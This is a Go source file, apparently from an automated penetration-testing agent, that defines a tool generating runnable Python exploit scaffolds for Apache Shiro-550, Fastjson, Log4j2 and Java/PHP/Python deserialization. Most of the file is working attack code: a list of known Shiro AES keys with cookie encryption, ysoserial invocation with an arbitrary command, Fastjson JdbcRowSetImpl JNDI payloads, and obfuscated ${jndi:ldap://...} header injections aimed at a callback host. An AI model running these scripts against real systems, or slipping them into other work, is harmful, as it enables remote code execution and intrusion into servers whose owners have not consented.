package agent

// Java 组件专用 PoC 骨架（v0.8.0）：java_poc_scaffold。
//
// poc_scaffold 解决的是“每个漏洞类别从零写脚本”的问题，但 shiro-550 / fastjson /
// log4j2 / 反序列化这四类有共同的现场难点：不是 GET 参数拼一个 payload 就完事，
// 而是要先判断“组件在不在、处理链走没走到、key/autoType/日志 lookup 是否真的生效”。
// 通用模板套不进去，worker 最后又回到手写零散 curl，命中与否全凭感觉。
//
// 本工具按组件生成专用 Python 骨架：
//   - shiro550：rememberMe=deleteMe 指纹 + AES-CBC 加密 + 常见 key 列表；
//     key 验证必须有一条真实序列化 payload（payload_file 或 ysoserial），
//     随机 blob 分不出 key 对错，脚本不会拿它冒充命中。
//   - fastjson：@type 探测；默认只发 DNS/URL（低风险），--exploit 才发 JNDI；
//     只有错误特征或回调 token 才算证据。
//   - log4j2：常用头/参数注入 ${jndi:...}；DNS/HTTP 回调只证明 lookup，
//     不等于 RCE，脚本会明确写出这个边界。
//   - deser：Java/PHP/Python 反序列化 magic 与错误特征探测；payload_file 才发
//     真实利用字节，错误特征只证明 sink 存在。
//
// 统一纪律：MATCH 必须有具体响应/回调证据；没有证据时打印 PENDING/排查提示，
// 不把“请求发出去了”写成“打成功了”。

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	actool "github.com/Autumn-27/norma/tool"
)

const javaPocCommon = `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""pojun Java 组件 PoC 骨架 (__CLASS__) — 先指纹/错误特征，再谈利用。

用法：
  python3 本文件 [target] [param] [--oast host] [--oast-check URL]
                [--payload-file FILE] [--key KEY] [--method GET|POST]
                [--header NAME] [--exploit]

判据：只有拿到具体响应/回调证据才打印 MATCH；否则打印 PENDING 或排查提示。
"""
import sys, os, ssl, json, re, time, base64, gzip, urllib.request, urllib.parse, urllib.error

BASE = '__TARGET__'
PARAM = '__PARAM__'
OAST = '__OAST__'
OAST_CHECK_URL = '__OAST_CHECK_URL__'
METHOD = '__METHOD__'
HEADER = '__HEADER__'
PAYLOAD_FILE = '__PAYLOAD_FILE__'
KEY = '__KEY__'

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

OPENER = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=CTX))

def argval(flag, default):
    if flag in sys.argv:
        i = sys.argv.index(flag)
        if i + 1 < len(sys.argv):
            return sys.argv[i + 1]
    return default

if len(sys.argv) > 1 and not sys.argv[1].startswith("-"):
    BASE = sys.argv[1]
if len(sys.argv) > 2 and not sys.argv[2].startswith("-"):
    PARAM = sys.argv[2]
OAST = argval("--oast", OAST)
OAST_CHECK_URL = argval("--oast-check", OAST_CHECK_URL)
PAYLOAD_FILE = argval("--payload-file", PAYLOAD_FILE)
KEY = argval("--key", KEY)
METHOD = argval("--method", METHOD).upper()
HEADER = argval("--header", HEADER)

def headers_of(msg):
    out = {}
    try:
        items = msg.items()
    except Exception:
        return out
    for k, v in items:
        out[k] = (out.get(k, "") + "\n" + v) if k in out else v
    return out

def http(url, method="GET", data=None, headers=None, timeout=15):
    h = {"User-Agent": UA}
    h.update(headers or {})
    body = data.encode("utf-8", "replace") if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, method=method, headers=h)
    t0 = time.time()
    try:
        with OPENER.open(req, timeout=timeout) as r:
            return r.status, headers_of(r.headers), r.read(2_000_000), int((time.time()-t0)*1000)
    except urllib.error.HTTPError as e:
        return e.code, headers_of(e.headers), e.read(1_000_000), int((time.time()-t0)*1000)
    except Exception as e:
        return 0, {}, str(e).encode(), int((time.time()-t0)*1000)

def inject(base, param, payload):
    if "FUZZ" in base:
        return base.replace("FUZZ", urllib.parse.quote(payload, safe=""))
    u = urllib.parse.urlsplit(base)
    q = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
    q = [(k, v) for (k, v) in q if k != param] + [(param, payload)]
    return urllib.parse.urlunsplit((u.scheme, u.netloc, u.path, urllib.parse.urlencode(q), u.fragment))

def text_of(body):
    return body.decode("utf-8", "replace") if isinstance(body, bytes) else str(body)

def hget(hd, name):
    for k, v in hd.items():
        if k.lower() == name.lower():
            return v
    return ""

def set_cookie(hd):
    return hget(hd, "Set-Cookie")

def show(label, status, hd, body, ms):
    txt = text_of(body)
    print(json.dumps({"probe": label, "status": status, "ms": ms, "len": len(txt),
                      "set_cookie": set_cookie(hd)[:240], "head": txt[:300]}, ensure_ascii=False))

def oast_host():
    s = (OAST or "").strip()
    if not s:
        return ""
    if "://" in s:
        s = urllib.parse.urlsplit(s).netloc
    return s.strip("/")

def make_token(prefix):
    return "%s%d" % (prefix, int(time.time()))

def oast_wait(token, tries=3, delay=2):
    if not OAST_CHECK_URL:
        return False
    url = OAST_CHECK_URL.replace("{token}", token)
    for _ in range(tries):
        st, hd, bd, ms = http(url, timeout=10)
        if token.lower() in text_of(bd).lower():
            return True
        time.sleep(delay)
    return False

def finish(hits, total, missing=""):
    print("SUMMARY hits=%d total=%d" % (len(hits), total))
    if not hits:
        print("[!] 无命中：先确认基准请求可达（status>0），再换入口/参数位置/编码/版本。不要据此判死。")
        if missing:
            print("[!] " + missing)
`

var javaPocTemplates = map[string]string{
	"shiro550": `# Shiro-550：先用无效 rememberMe 看 deleteMe 指纹，再用真实序列化 payload 验证 key。
# 注意：deleteMe 只证明 RememberMe 处理链存在；key 命中还需要一条能反序列化的 payload。
KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "6ZmI6I2j5Y+R5aSn5ZOlAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "U3ByaW5nQmxhZGUAAAAAAA==",
    "5aaC5qKm5oqA5pyvAAAAAA==",
    "1AvVhdsgUs0FSA3SDFAdag==",
]
hits = []
print("[*] target=%s" % BASE)
st, hd, bd, ms = http(BASE)
show("baseline", st, hd, bd, ms)
st, hd, bd, ms = http(BASE, headers={"Cookie": "rememberMe=pojun"})
sc = set_cookie(hd)
show("rememberMe-invalid", st, hd, bd, ms)
if "rememberme=deleteme" in sc.lower():
    hits.append("fingerprint")
    print("MATCH shiro-fingerprint deleteMe -> RememberMe 处理链存在（仅指纹，不等于有可利用 key）")
else:
    print("[!] 未见 deleteMe：可能不是 Shiro、Cookie 被代理剥离，或该路径不经过 Shiro 过滤器。")

def aes_encrypt(raw, key_b64):
    key = base64.b64decode(key_b64)
    if len(key) not in (16, 24, 32):
        raise ValueError("key 长度不是 16/24/32 字节")
    iv = os.urandom(16)
    pad = 16 - (len(raw) % 16)
    data = raw + bytes([pad]) * pad
    try:
        from Crypto.Cipher import AES
        ct = AES.new(key, AES.MODE_CBC, iv).encrypt(data)
    except Exception:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
        ct = enc.update(data) + enc.finalize()
    return base64.b64encode(iv + ct).decode()

payload_path = PAYLOAD_FILE
ysoserial = argval("--ysoserial", "")
gadget = argval("--gadget", "CommonsBeanutils1")
command = argval("--command", "id")
if not payload_path and ysoserial:
    try:
        import subprocess
        raw = subprocess.check_output(["java", "-jar", ysoserial, gadget, command], timeout=120)
        payload_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "shiro-payload.bin")
        with open(payload_path, "wb") as f:
            f.write(raw)
        print("[*] ysoserial 生成 payload %d bytes -> %s" % (len(raw), payload_path))
    except Exception as e:
        print("[!] ysoserial 生成失败：%s" % e)

if not payload_path:
    print("[*] 未提供 payload_file/--ysoserial：只输出指纹，不猜 key、不宣称利用成功。")
    print("[*] 下一步：用 ysoserial 生成序列化 payload，再用 --payload-file 传入；或直接给 --ysoserial 路径。")
    finish(hits, 1, "key 验证需要一条可反序列化的 payload；随机 blob 无法区分 key 对错。")
    sys.exit(0)

try:
    raw = open(payload_path, "rb").read()
except Exception as e:
    print("[!] 读取 payload 失败：%s" % e)
    finish(hits, 1)
    sys.exit(0)

if KEY:
    keys = [KEY] + [k for k in KEYS if k != KEY]
else:
    keys = KEYS
for key in keys:
    try:
        enc = aes_encrypt(raw, key)
    except Exception as e:
        print("[!] 加密失败 key=%s：%s" % (key, e))
        continue
    st, hd, bd, ms = http(BASE, headers={"Cookie": "rememberMe=" + enc})
    sc = set_cookie(hd)
    show("key=" + key, st, hd, bd, ms)
    if "rememberme=deleteme" not in sc.lower():
        hits.append(key)
        print("MATCH shiro-key key=%s 未回 deleteMe；这只能说明解密/反序列化未立刻失败，仍需回连或命令输出二次确认。" % key)
finish(hits, len(keys), "key 命中不等于 RCE：用回连/命令输出/文件落地任一条证据复核。")
`,

	"fastjson": `# Fastjson autoType 探测：默认只发 DNS/URL；--exploit 才追加 JNDI。
host = oast_host()
token = make_token("fjson")
if not host:
    print("[!] 未提供 --oast：只做错误特征探测，无法确认 @type 是否真的被解析。")
    host = "127.0.0.1:9"
probes = [
    ("Inet4Address", {"@type": "java.net.Inet4Address", "val": token + "." + host}),
    ("URL", {"@type": "java.net.URL", "val": "http://" + token + "." + host + "/"}),
    ("InetSocketAddress", {"@type": "java.net.InetSocketAddress", "address": token + "." + host, "port": 80}),
]
if "--exploit" in sys.argv:
    probes.append(("JdbcRowSetImpl-1.2.24",
                   {"@type": "com.sun.rowset.JdbcRowSetImpl",
                    "dataSourceName": "ldap://" + host + "/" + token,
                    "autoCommit": True}))
    probes.append(("JdbcRowSetImpl-1.2.47-cache",
                   {"a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"},
                    "b": {"@type": "com.sun.rowset.JdbcRowSetImpl",
                          "dataSourceName": "ldap://" + host + "/" + token,
                          "autoCommit": True}}))
    print("[*] --exploit：已加入 1.2.24/1.2.47 JNDI payload；需要你另行启动 LDAP/RMI 服务并确认命令/回连证据。")
hits = []
sigs = [
    "autotype is not support", "com.alibaba.fastjson", "classnotfoundexception",
    "illegalaccessexception", "jsonexception", "java.lang.classcastexception",
]
for label, obj in probes:
    body = json.dumps(obj, ensure_ascii=False)
    if METHOD == "GET":
        st, hd, bd, ms = http(inject(BASE, PARAM or "q", body))
    else:
        st, hd, bd, ms = http(BASE, "POST", body, {"Content-Type": "application/json"})
    show(label, st, hd, bd, ms)
    low = text_of(bd).lower()
    if any(s in low for s in sigs):
        hits.append(label)
        print("MATCH fastjson-sink %s 返回 autoType/解析错误特征；说明 JSON 进入了 fastjson，不等于 RCE。" % label)
    if oast_wait(token):
        hits.append(label + ":oast")
        print("MATCH fastjson-oast %s 回调命中 token=%s" % (label, token))
if not hits:
    print("[*] 未命中：换入口（body 包一层/换参数名/换 Content-Type）、换版本 payload（1.2.24/1.2.47），或提供 --oast-check 复核回调。")
finish(hits, len(probes), "fastjson 的 @type 成功与否要看解析错误特征或回调；状态码 500 本身不算证据。")
`,

	"log4j2": `# Log4j2 lookup 探测：向常用头/参数注入 ${jndi:...}；回调需 --oast-check 才能自动判 MATCH。
host = oast_host()
token = make_token("log4j")
if not host:
    print("[!] 未提供 --oast：仍会发 payload，但无法自动确认 lookup；不要凭状态码判命。")
    host = "127.0.0.1:9"
payloads = [
    "${jndi:dns://%s/%s}" % (host, token),
    "${jndi:ldap://%s/%s}" % (host, token),
    "${${lower:j}ndi:${lower:l}dap://%s/%s}" % (host, token),
    "${jndi:ldap://${sys:java.version}.%s/%s}" % (host, token),
]
method = METHOD if METHOD in ("GET", "POST") else "GET"
hdrs = [HEADER] if HEADER else ["User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version", "Cookie"]
hits = []
for h in hdrs:
    for p in payloads:
        st, hd, bd, ms = http(BASE, method, headers={h: p})
        show(h + "=" + p[:80], st, hd, bd, ms)
        if oast_wait(token):
            hits.append(h)
            print("MATCH log4j2-oast header=%s token=%s" % (h, token))
            break
    if hits:
        break
if PARAM and not hits:
    for p in payloads:
        st, hd, bd, ms = http(inject(BASE, PARAM, p), method)
        show("param=" + PARAM + " " + p[:80], st, hd, bd, ms)
        if oast_wait(token):
            hits.append("param:" + PARAM)
            print("MATCH log4j2-oast param=%s token=%s" % (PARAM, token))
            break
finish(hits, len(hdrs) * len(payloads), "DNS/HTTP 回调只证明 lookup 发生，不等于命令执行；JNDI 利用需另起 LDAP/RMI 服务并用命令输出/回连复核。")
`,

	"deser": `# 通用反序列化 sink 探测：先发 magic/畸形对象看错误特征；payload_file 才发真实利用字节。
def encode(data, mode):
    if mode == "base64":
        return base64.b64encode(data)
    if mode == "gzip":
        return base64.b64encode(gzip.compress(data))
    return data

tests = [
    ("java-magic", b"\xac\xed\x00\x05", "raw"),
    ("php-serialized", b's:4:"test";', "raw"),
    ("php-object", b'O:8:"stdClass":0:{}', "raw"),
    ("pickle-invalid", b"\x80\x04\xff", "base64"),
]
if PAYLOAD_FILE:
    try:
        raw = open(PAYLOAD_FILE, "rb").read()
        tests = [("payload-raw", raw, "raw"), ("payload-base64", raw, "base64"),
                 ("payload-gzip-base64", raw, "gzip")]
        print("[*] 已加载 payload %d bytes：真实利用是否成功要看命令输出/回连，不靠错误特征。" % len(raw))
    except Exception as e:
        print("[!] 读取 payload 失败：%s" % e)
        sys.exit(0)
hits = []
sigs = [
    "java.io.invalidclassexception", "classnotfoundexception", "streamcorruptedexception",
    "cannot deserialize", "serialversionuid", "invalidclassexception",
    "unserialize()", "__php_incomplete_class", "notice: unserialize",
    "unpicklingerror", "cannot unpickle",
]
method = METHOD if METHOD in ("GET", "POST") else "POST"
for label, data, mode in tests:
    body = encode(data, mode)
    if method == "GET":
        st, hd, bd, ms = http(inject(BASE, PARAM or "data", base64.b64encode(body).decode()))
    else:
        st, hd, bd, ms = http(BASE, "POST", body, {"Content-Type": "application/octet-stream"})
    show(label, st, hd, bd, ms)
    low = text_of(bd).lower()
    if any(s in low for s in sigs):
        hits.append(label)
        print("MATCH deser-sink %s 返回反序列化错误特征；只证明 sink 存在，不等于利用成功。" % label)
finish(hits, len(tests), "反序列化 sink 命中后还需要一条可用的 gadget/对象链；用 payload_file 发真实字节并用命令输出/回连复核。")
`,
}

func (t *ToolSet) javaPocScaffold() actool.CoreTool {
	classes := make([]string, 0, len(javaPocTemplates))
	for k := range javaPocTemplates {
		classes = append(classes, k)
	}
	sort.Strings(classes)

	return writeTool(
		"java_poc_scaffold",
		"按 Java 组件类别生成【专用可运行 Python PoC 骨架】并落进任务共享目录（shared/scripts），"+
			"返回脚本路径与运行命令。类别："+strings.Join(classes, "/")+"。\n"+
			"shiro550=rememberMe deleteMe 指纹 + AES-CBC + 常见 key（key 验证必须给 payload_file/--ysoserial，随机 blob 不算）；"+
			"fastjson=@type 探测（默认仅 DNS/URL，exploit=true 才发 JNDI）；"+
			"log4j2=常用头/参数注入 ${jndi:...}（回调需 oast_check_url 才能自动判 MATCH）；"+
			"deser=Java/PHP/Python 反序列化 magic 与错误特征，payload_file 才发真实利用字节。\n"+
			"纪律：脚本只在拿到具体响应/回调证据时打印 MATCH；没有 oast_check_url 时回调类只输出 PENDING，"+
			"不把“请求发出去了”写成“打成功了”。",
		obj(map[string]any{
			"vulnclass":      str("类别：" + strings.Join(classes, "/")),
			"target":         str("目标 URL；含 FUZZ 时替换为载荷，否则按 param 注入查询参数"),
			"param":          str("参数/请求头名（可选；shiro 忽略，log4j 默认 User-Agent，fastjson/deser 默认 q/data）"),
			"oast":           str("回调域名或 URL（可选，如 xxx.dnslog.cn 或 http://xxx.oast/）；fastjson/log4j 强烈建议填"),
			"oast_check_url": str("可选：返回回调日志文本的 URL（可含 {token}）；提供后脚本会轮询并只在看到 token 时判 MATCH"),
			"payload_file":   str("可选：序列化 payload 文件（shiro550/deser）；shiro 也可用脚本的 --ysoserial 现场生成"),
			"key":            str("可选：Shiro key（base64）；留空则用内置常见 key 列表"),
			"method":         str("GET|POST，默认按类别（shiro/log4j=GET，fastjson/deser=POST）"),
			"header":         str("可选：log4j2 注入头名，默认 User-Agent；留空测常用头"),
			"exploit":        map[string]any{"type": "boolean", "description": "仅 fastjson：加入 JNDI 利用探测（默认只发 DNS/URL）"},
			"name":           str("脚本文件名（可选，默认 <class>-<时间戳>.py）"),
		}, "vulnclass", "target"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				VulnClass    string `json:"vulnclass"`
				Target       string `json:"target"`
				Param        string `json:"param"`
				OAST         string `json:"oast"`
				OASTCheckURL string `json:"oast_check_url"`
				PayloadFile  string `json:"payload_file"`
				Key          string `json:"key"`
				Method       string `json:"method"`
				Header       string `json:"header"`
				Exploit      bool   `json:"exploit"`
				Name         string `json:"name"`
			}
			_ = json.Unmarshal(in, &a)
			class := strings.ToLower(strings.TrimSpace(a.VulnClass))
			tpl, ok := javaPocTemplates[class]
			if !ok {
				return actool.Errorf("不支持的类别: " + class + "（可用：" + strings.Join(classes, "/") + "）"), nil
			}
			target := strings.TrimSpace(a.Target)
			if target == "" {
				return actool.Errorf("target 不能为空"), nil
			}
			param := strings.TrimSpace(a.Param)
			if param == "" {
				param = defaultJavaPocParam(class)
			}
			method := strings.ToUpper(strings.TrimSpace(a.Method))
			if method == "" {
				method = defaultJavaPocMethod(class)
			}
			header := strings.TrimSpace(a.Header)
			if header == "" && class == "log4j2" {
				header = "User-Agent"
			}
			dir := t.sharedDir()
			if dir == "" {
				return actool.Errorf("任务共享目录不可用（runDir 未注入）"), nil
			}
			name := sanitizeScriptName(a.Name)
			if name == "" {
				name = fmt.Sprintf("%s-%d.py", class, time.Now().Unix()%100000)
			} else if !strings.HasSuffix(strings.ToLower(name), ".py") {
				name += ".py"
			}
			content := strings.NewReplacer(
				"__CLASS__", class,
				"__TARGET__", pyQuote(target),
				"__PARAM__", pyQuote(param),
				"__OAST_CHECK_URL__", pyQuote(strings.TrimSpace(a.OASTCheckURL)),
				"__OAST__", pyQuote(strings.TrimSpace(a.OAST)),
				"__METHOD__", pyQuote(method),
				"__HEADER__", pyQuote(header),
				"__PAYLOAD_FILE__", pyQuote(strings.TrimSpace(a.PayloadFile)),
				"__KEY__", pyQuote(strings.TrimSpace(a.Key)),
			).Replace(javaPocCommon)
			path := filepath.Join(dir, "scripts", name)
			if err := os.WriteFile(path, []byte(content+"\n"+tpl), 0o755); err != nil {
				return actool.Errorf("写入脚本失败: " + err.Error()), nil
			}

			args := []string{"timeout", "300", "python3", shellQuote(path), shellQuote(target)}
			if strings.TrimSpace(a.Param) != "" {
				args = append(args, shellQuote(strings.TrimSpace(a.Param)))
			}
			if strings.TrimSpace(a.OAST) != "" {
				args = append(args, "--oast", shellQuote(strings.TrimSpace(a.OAST)))
			}
			if strings.TrimSpace(a.OASTCheckURL) != "" {
				args = append(args, "--oast-check", shellQuote(strings.TrimSpace(a.OASTCheckURL)))
			}
			if strings.TrimSpace(a.PayloadFile) != "" {
				args = append(args, "--payload-file", shellQuote(strings.TrimSpace(a.PayloadFile)))
			}
			if strings.TrimSpace(a.Key) != "" {
				args = append(args, "--key", shellQuote(strings.TrimSpace(a.Key)))
			}
			if strings.TrimSpace(a.Method) != "" {
				args = append(args, "--method", shellQuote(method))
			}
			if strings.TrimSpace(a.Header) != "" {
				args = append(args, "--header", shellQuote(header))
			}
			if a.Exploit {
				args = append(args, "--exploit")
			}
			return jsonResult(map[string]any{
				"path":            path,
				"vulnclass":       class,
				"run_with_bash":   strings.Join(args, " "),
				"oast_configured": strings.TrimSpace(a.OAST) != "",
				"notes":           javaPocNotes(class),
			})
		},
	)
}

func defaultJavaPocParam(class string) string {
	switch class {
	case "shiro550":
		return ""
	case "fastjson":
		return "q"
	case "deser":
		return "data"
	default:
		return ""
	}
}

func defaultJavaPocMethod(class string) string {
	switch class {
	case "shiro550", "log4j2":
		return "GET"
	default:
		return "POST"
	}
}

func javaPocNotes(class string) []string {
	switch class {
	case "shiro550":
		return []string{
			"deleteMe 只证明 Shiro RememberMe 处理链存在，不等于有可利用 key。",
			"key 验证必须用一条真实序列化 payload：--payload-file，或用 --ysoserial 指向 ysoserial.jar 现场生成。",
			"key 未回 deleteMe 仍需回连/命令输出/文件落地二次确认，不能只凭这一点写 RCE。",
			"key 未回 deleteMe 也可能是 gadget 链/依赖不匹配导致反序列化失败——换 gadget 或先确认目标 classpath。",
		}
	case "fastjson":
		return []string{
			"默认只发 DNS/URL 探测；exploit=true 才追加 JNDI payload。",
			"错误特征只能证明 JSON 进入 fastjson，不等于 autoType 利用成功。",
			"要自动判回调，请提供 oast_check_url；否则用 DNS/HTTP 日志人工核对 token。",
		}
	case "log4j2":
		return []string{
			"DNS/HTTP 回调只证明 lookup 发生，不等于命令执行。",
			"JNDI 利用需要另起 LDAP/RMI 服务，并用命令输出/回连复核。",
			"没有 oast_check_url 时脚本不会打印 MATCH，只输出已发送的 payload 和状态码。",
		}
	case "deser":
		return []string{
			"错误特征只证明反序列化 sink 存在，不等于利用成功。",
			"实际利用需要 payload_file（Java 序列化字节/PHP 对象/Python pickle），并用命令输出或回连复核。",
			"GET 模式会把 payload 再 base64 一次放进参数；POST 模式按原始字节发送。",
		}
	default:
		return nil
	}
}
